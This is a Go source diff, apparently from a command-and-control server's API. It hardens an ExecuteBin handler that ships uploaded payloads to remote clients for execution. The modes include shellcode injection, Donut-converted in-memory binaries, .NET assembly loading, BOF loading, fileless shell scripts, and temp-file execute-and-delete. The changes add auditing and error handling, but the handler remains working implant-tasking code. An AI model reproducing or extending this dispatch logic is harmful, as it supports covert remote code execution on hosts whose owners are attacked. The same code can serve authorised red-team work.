@@ -1,6 +1,7 @@
 package api
 
 import (
+	"BackendTemplate/pkg/audit"
 	"BackendTemplate/pkg/command"
 	"BackendTemplate/pkg/connection"
 	"BackendTemplate/pkg/database"
@@ -100,12 +101,52 @@ func TakeScreenshot(c *gin.Context) {
 	}
 }
 
+// executeBinModes 支持的载荷执行模式（与前端 PluginsView 的 7 个模式一一对应）
+var executeBinModes = map[string]bool{
+	"execute-assembly": true,
+	"inline-bin":       true,
+	"shellcode-inject": true,
+	"script":           true,
+	"binary":           true,
+	"bof":              true,
+	"exec-file":        true,
+}
+
+// auditBinExecute 记录内存执行载荷下发（CategoryCommand 此前全仓无人使用）。
+// args 可能很长（含命令行参数），截断后再入审计。
+func auditBinExecute(c *gin.Context, result, mode, uid, fileName string, size int, args, errMsg string) {
+	if audit.GlobalAuditLogger == nil {
+		return
+	}
+	const maxArgsInAudit = 200
+	if len(args) > maxArgsInAudit {
+		args = args[:maxArgsInAudit] + "...(truncated)"
+	}
+	details := map[string]interface{}{
+		"uid": uid, "mode": mode, "file": fileName, "size": size, "args": args,
+	}
+	if errMsg != "" {
+		details["error"] = errMsg
+	}
+	level := audit.LogLevelInfo
+	if result == "FAILURE" {
+		level = audit.LogLevelError
+	}
+	audit.GlobalAuditLogger.LogWithContext(c, level, audit.CategoryCommand, "BIN_EXECUTE",
+		result, "内存执行载荷下发", details)
+}
+
 // ExecuteBin Windows内存执行 API（tshell功能移植）
 
 func ExecuteBin(c *gin.Context) {
-	file, _ := c.FormFile("file")
-	if file == nil {
-		c.JSON(200, gin.H{"status": 400, "data": "No file uploaded"})
+	file, err := c.FormFile("file")
+	if err != nil || file == nil {
+		// 不能丢错误：请求体超过上限时 MaxBytesReader 的报错就落在这里
+		msg := "No file uploaded"
+		if err != nil {
+			msg = "获取上传文件失败: " + err.Error()
+		}
+		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "data": msg})
 		return
 	}
 	// 大小上限（100MB）：防止一次性读入内存导致 OOM
@@ -133,9 +174,37 @@ func ExecuteBin(c *gin.Context) {
 	args := c.PostForm("args")
 	mode := c.PostForm("mode")
 
-	var shellHistory database.Shell
-	database.Engine.Where("uid = ?", uid).Get(&shellHistory)
+	if uid == "" {
+		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "data": "缺少 uid"})
+		return
+	}
+	// uid 必须真实存在：原来不校验，对着任意字符串也会写 shell 历史并返回 200
+	if _, err := database.GetClientByUid(uid); err != nil {
+		c.JSON(http.StatusNotFound, gin.H{"status": 404, "data": "客户端不存在: " + uid})
+		return
+	}
+	if !executeBinModes[mode] {
+		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "data": "Invalid execution mode"})
+		return
+	}
+
+	auditBinExecute(c, "START", mode, uid, file.Filename, len(fileBytes), args, "")
+
+	// 记录到 shell 历史（校验通过后再写：原来非法 mode 也会污染历史）
 	database.AppendShellContent(uid, "$ "+mode+" "+file.Filename+" "+args+"\n")
+
+	// finish 统一投递并回执。投递失败必须让调用方看到——原来 sendByProtocol 只打日志，
+	// 接口一律返回 200，前端因此一直显示"命令已发送"而载荷其实被丢弃。
+	finish := func(payload []byte) {
+		if err := sendcommand.SendFileUploadCommandChecked(uid, payload); err != nil {
+			logx.Warnf("❌ [BIN-EXECUTE] 载荷下发失败: uid=%s mode=%s err=%v\n", uid, mode, err)
+			auditBinExecute(c, "FAILURE", mode, uid, file.Filename, len(fileBytes), args, err.Error())
+			c.JSON(http.StatusServiceUnavailable, gin.H{"status": 503, "data": "命令下发失败: " + err.Error()})
+			return
+		}
+		auditBinExecute(c, "SUCCESS", mode, uid, file.Filename, len(fileBytes), args, "")
+		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
+	}
 
 	// 根据不同模式处理，并在处理完成后统一返回响应
 	switch mode {
@@ -148,8 +217,7 @@ func ExecuteBin(c *gin.Context) {
 		cmdTypeBytes := make([]byte, 4)
 		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.ExecuteAssembly))
 		byteToSend = append(cmdTypeBytes, byteToSend...)
-		sendcommand.SendFileUploadCommand(uid, byteToSend)
-		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
+		finish(byteToSend)
 	case "inline-bin":
 		var u database.Clients
 		database.Engine.Where("uid = ?", uid).Get(&u)
@@ -157,20 +225,19 @@ func ExecuteBin(c *gin.Context) {
 		payload, err := godonut.GenShellcode(fileBytes, args, u.Arch)
 		if err != nil {
 			errorMsg := fmt.Sprintf("Unable to generate shellcode for %s: %v\n\nInline Bin mode requires files that can be converted to shellcode.\n\nFor fscan.exe and similar tools, please:\n1. Use traditional file upload and execution\n2. Convert to shellcode format first\n3. Use a shellcode generator tool", file.Filename, err)
+			auditBinExecute(c, "FAILURE", mode, uid, file.Filename, len(fileBytes), args, "Donut 转换失败: "+err.Error())
 			c.JSON(http.StatusOK, gin.H{"status": 400, "data": errorMsg})
 			return
 		}
 		cmdTypeBytes := make([]byte, 4)
 		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.InlineBin))
 		byteToSend := utils.BytesCombine(cmdTypeBytes, payload)
-		sendcommand.SendFileUploadCommand(uid, byteToSend)
-		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
+		finish(byteToSend)
 	case "shellcode-inject":
 		cmdTypeBytes := make([]byte, 4)
 		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.InlineBin))
 		byteToSend := utils.BytesCombine(cmdTypeBytes, fileBytes)
-		sendcommand.SendFileUploadCommand(uid, byteToSend)
-		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
+		finish(byteToSend)
 	case "script":
 		// Linux 脚本内存执行(fileless sh -s 管道): [4B len][script bytes][args]
 		fileLength := len(fileBytes)
@@ -180,8 +247,7 @@ func ExecuteBin(c *gin.Context) {
 		cmdTypeBytes := make([]byte, 4)
 		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.ExecuteLinuxScript))
 		byteToSend = append(cmdTypeBytes, byteToSend...)
-		sendcommand.SendFileUploadCommand(uid, byteToSend)
-		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
+		finish(byteToSend)
 	case "binary":
 		// Linux 二进制执行(/tmp 写执行删): [4B len][binary bytes][4B argsLen][args]
 		fileLength := len(fileBytes)
@@ -194,8 +260,7 @@ func ExecuteBin(c *gin.Context) {
 		cmdTypeBytes := make([]byte, 4)
 		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.ExecuteLinuxBin))
 		byteToSend = append(cmdTypeBytes, byteToSend...)
-		sendcommand.SendFileUploadCommand(uid, byteToSend)
-		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
+		finish(byteToSend)
 	case "bof":
 		// BOF(COFF)内存执行: [4B len][coff bytes][4B argsLen][args]
 		fileLength := len(fileBytes)
@@ -208,8 +273,7 @@ func ExecuteBin(c *gin.Context) {
 		cmdTypeBytes := make([]byte, 4)
 		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.ExecuteBof))
 		byteToSend = append(cmdTypeBytes, byteToSend...)
-		sendcommand.SendFileUploadCommand(uid, byteToSend)
-		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
+		finish(byteToSend)
 	case "exec-file":
 		// 文件执行(写临时文件->执行->捕获输出->删除;支持 Donut 无法转换的 Go/Rust PE)
 		// 跨平台:Windows 写 .exe 到 %TEMP%;Linux 写无扩展名到 /tmp
@@ -224,10 +288,10 @@ func ExecuteBin(c *gin.Context) {
 		cmdTypeBytes := make([]byte, 4)
 		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.ExecuteFile))
 		byteToSend = append(cmdTypeBytes, byteToSend...)
-		sendcommand.SendFileUploadCommand(uid, byteToSend)
-		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
+		finish(byteToSend)
 	default:
-		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "Invalid execution mode"})
+		// 白名单已在入口拦住，这里只是兜底
+		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "data": "Invalid execution mode"})
 	}
 }
 
